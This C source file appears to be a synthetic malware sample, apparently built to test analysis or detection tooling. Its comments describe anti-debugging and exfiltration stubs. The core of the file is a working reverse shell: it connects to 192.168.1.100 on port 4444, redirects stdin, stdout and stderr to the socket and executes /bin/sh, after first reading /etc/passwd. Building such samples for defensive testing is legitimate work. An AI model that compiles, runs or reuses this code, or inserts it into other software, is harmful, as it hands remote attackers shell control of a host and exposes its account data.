#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static void anti_debug(void) {
    // Anti-debugging: ptrace self-attach
    // In a real sample this would call ptrace(PTRACE_TRACEME, 0, 0, 0)
    // We just reference the functions so they appear as imports
}

static int establish_c2(const char* host, int port) {
    int sockfd;
    struct sockaddr_in addr;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return -1;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_addr(host);
    addr.sin_addr.s_addr = inet_addr(host);

    if (connect(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sockfd);
        return -1;
    }
    return sockfd;
}

static void exec_shell(int sockfd) {
    // Redirect stdin/stdout/stderr to socket — classic reverse shell
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    execve("/bin/sh", NULL, NULL);
}

static void read_etc_passwd(void) {
    // Data exfiltration: read sensitive file
    FILE* f = fopen("/etc/passwd", "r");
    if (!f) return;
    char buf[4096];
    size_t n = fread(buf, 1, sizeof(buf), f);
    fclose(f);
    // Would send over network in real malware
    (void)n;
}

int main(void) {
    anti_debug();
    read_etc_passwd();
    int fd = establish_c2("192.168.1.100", 4444);
    if (fd >= 0) {
        exec_shell(fd);
    }
    return 1;
}
